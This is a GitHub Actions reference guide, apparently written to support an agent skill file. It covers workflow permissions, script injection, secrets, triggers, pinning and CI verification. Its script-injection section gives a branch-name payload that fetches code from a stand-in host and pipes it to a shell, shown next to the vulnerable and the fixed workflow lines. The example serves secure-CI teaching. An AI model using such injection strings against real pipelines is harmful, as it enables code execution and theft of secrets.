# GitHub Actions Reference

Platform-specific rules that back the principles in `SKILL.md`. Snippets are illustrative; adapt names and paths.

---

## 1. Workflow Skeleton

```yaml
name: CI

on:
  pull_request:
  push:
    branches: [dev, staging, main]
  workflow_dispatch:

permissions:
  contents: read            # Workflow-wide floor; widen per job.

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version-file: .nvmrc
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npm test
      - run: npm run build
```

---

## 2. Permissions & Tokens

- Declare `permissions:` at the top level, using `contents: read` as the floor. Add `contents: write`, `pull-requests: write`, `packages: write`, `pages: write`, or `id-token: write` only on the jobs that need them.
- **Release attach needs `contents: write`.** Without it, `softprops/action-gh-release` (or `gh release upload`) fails with `403 Resource not accessible by integration` after the whole build has finished. Grant it on the release job up front.
- **`GITHUB_TOKEN` pushes don't trigger workflows.** Commits and tags pushed with `GITHUB_TOKEN` start no new runs (except `workflow_dispatch` and `repository_dispatch`). A bot cleanup won't redeploy, which helps. But an auto-version tag pushed this way won't fire an `on: push: tags` release workflow either. Use a GitHub App token or a fine-grained PAT when the chain is intended. Keep `[skip ci]` on bot commits as a second safeguard.
- **Protected branches block bot pushes** unless the bot is allowed to bypass. Check branch protection before a workflow relies on pushing to `dev` or `main`.
- Prefer OIDC (`id-token: write`) to long-lived cloud keys where the provider supports it.

---

## 3. Script Injection & Untrusted Input

`${{ }}` expressions are expanded into the script text **before** the shell runs it. Values an attacker can set (`github.head_ref`, `github.event.pull_request.title`, `.body`, commit messages, issue text) can break out of quoting.

```yaml
# Bad: a branch named  x;curl evil|sh  runs code.
- run: npx wrangler pages deploy dist --branch=${{ github.head_ref }}

# Good: the value arrives as data.
- env:
    BRANCH: ${{ github.head_ref || github.ref_name }}
  run: npx wrangler pages deploy dist --branch="$BRANCH"
```

- Apply the same rule to secrets: pass them with `env:` so they never appear in the rendered command line.
- In `actions/github-script`, read values from `context.payload`, not from `'${{ ... }}'` string literals.
- Avoid `pull_request_target` and `workflow_run` with a checkout of PR code. Those events run with write tokens and secrets. If you must use them, never execute the PR's code.

---

## 4. Secrets, Outputs & Environments

- Use `environment: <name>` on deploy jobs so secrets resolve per environment (`secrets.DATABASE_URL` means the production value in `production`). Add required reviewers or wait timers to `production` where the plan allows.
- `environment.url` shows the deployed URL on the run and on the PR, so set it from the deploy step's output.
- `::add-mask::$VALUE` masks a derived secret (for example a normalized connection string) **before** it is echoed or written to `$GITHUB_OUTPUT`.
- Outputs that contain secrets are redacted and **not** passed between jobs. Recompute them, or fetch them in the consuming job.
- Fail on missing required secrets:
  ```bash
  : "${DATABASE_URL:?DATABASE_URL is not set for this environment}"
  ```

---

## 5. Triggers, Path Filters & Required Checks

- **Path filters vs. required checks:** If a workflow is skipped by `paths:` or `branches:` filters, its required check stays *Pending* and blocks the merge. For required checks, either leave the workflow unfiltered and skip inside it (a job-level `if:`, or a `dorny/paths-filter` step; a job skipped by `if:` reports success), or don't mark that check required.
- Include the workflow file itself in its own `paths:` so edits to it run it.
- Separate PR validation from deploys inside one workflow with job-level `if: github.event_name == 'push'`. Never deploy from `pull_request` to shared tiers. Previews are their own environment.
- **Scheduled workflows** run on the default branch only, can be delayed at busy minutes (avoid `:00`), and are **auto-disabled after 60 days without repository activity** on public repos. Keep-alive cron jobs (for example, pinging a free-tier database) must account for that.

---

## 6. Concurrency

| Workflow type | `cancel-in-progress` | Why |
| :--- | :--- | :--- |
| PR validation | `true` | Only the newest commit matters. |
| Deploy to a tier | `false` (queue) | A cancelled deploy can leave half-applied migrations. |
| Tag or release build | `false` | Cancelling one abandons a release. |
| Repo writers (cleanup, version bump) | `false` | Overlapping pushes race, so serialize them. |

Writers also run `git pull --rebase origin <branch>` before `git push`, so a commit that landed during the run doesn't reject the push.

---

## 7. Action Pinning & Updates

- First-party `actions/*` may use a major tag (`@v4`). Third-party actions that receive secrets or write tokens should be pinned to a full commit SHA, with the version in a comment (`uses: owner/action@<sha> # v6.2`).
- Reusable workflows from a shared repo: callers pin to a release tag (`@v0.5.0`), not `@main`, so a change to the standard can't break every consumer at once.
- Enable Dependabot for the `github-actions` ecosystem so pins and majors stay current:
  ```yaml
  # .github/dependabot.yml
  version: 2
  updates:
    - package-ecosystem: github-actions
      directory: /
      schedule: { interval: weekly }
  ```
- Track Node runtime deprecations for actions (for example `node20` → `node24`) by bumping action majors when warnings appear.

---

## 8. Artifacts, Caching & Runners

- Use `actions/upload-artifact` / `download-artifact` to pass the built output from the test job to deploy jobs (build once). Set `retention-days` short (1–7) for intermediates.
- Release deliverables go on the GitHub Release (with `fail_on_unmatched_files: true`), not just as run artifacts.
- Use `actions/setup-*` with built-in `cache:`, or `actions/cache` keyed on the lockfile hash.
- **Disk space:** `ubuntu-latest` has about 14 GB free. Big native builds (Rust/Bevy, Android, large Docker images) can die mid-step **with no logs**. Delete unused preinstalled toolchains first (`sudo rm -rf /usr/share/dotnet /usr/local/lib/android /opt/ghc /opt/hostedtoolcache/CodeQL`) and print `df -h`.
- Job default timeout is 360 minutes, so always set `timeout-minutes`.

---

## 9. Reusable Workflows & Composite Actions

- Use `on: workflow_call` with typed `inputs:` for shared jobs (branch notes validate/prune, release). Pass secrets explicitly, or with `secrets: inherit` only for trusted, same-owner callers.
- The caller's `permissions:` caps what the called workflow can use, so callers must grant what it needs (for example `contents: write` for a cleanup).
- Use composite actions (`action.yml`, `runs.using: composite`) for repeated step sequences within a repo.

---

## 10. PR Feedback

- Sticky comments: find an existing bot comment by a fixed header marker and update it, instead of posting one per push.
- Use workflow commands for visibility: `::error::`, `::warning::`, `::notice::`, and `$GITHUB_STEP_SUMMARY` for run summaries.
- PR title lint: `amannn/action-semantic-pull-request` on `opened`, `edited`, `synchronize`.

---

## 11. Local & Agent Verification

- `actionlint` (static, including shellcheck of `run:` blocks) on every changed workflow.
- Run step scripts locally against a throwaway clone or bare remote. `act` is optional and imperfect for services and OIDC.
- Trigger and watch with one blocking call:
  ```bash
  gh workflow run ci.yml --ref my-branch
  gh run watch "$(gh run list --workflow ci.yml --branch my-branch --limit 1 --json databaseId -q '.[0].databaseId')" --exit-status
  gh pr checks 123 --watch --fail-fast
  ```
- Read failures with `gh run view <id> --log-failed` rather than dumping full logs into context.
